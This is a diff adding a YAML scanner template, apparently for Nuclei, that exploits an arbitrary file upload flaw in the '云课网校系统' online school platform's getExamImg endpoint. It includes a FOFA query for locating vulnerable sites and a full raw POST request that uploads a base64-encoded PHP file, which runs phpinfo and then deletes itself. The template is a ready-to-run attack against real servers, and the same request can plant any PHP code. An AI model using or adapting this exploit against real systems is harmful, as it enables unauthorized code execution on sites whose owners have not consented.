@@ -1,0 +1,34 @@
+id: poc-lnvcnsvlkai1adlu
+info:
+  name: 云课网校系统 getExamImg 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lnvcnsvlkai1adlu'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lnvcnsvlkai1adlu
+    fofa: body="/static/libs/common/jquery.stickyNavbar.min.js"
+http:
+- raw:
+  - 'POST /index/Exam/getExamImg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: */*
+
+    Connection: close
+
+
+    src_data=data:image/php;base64,PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
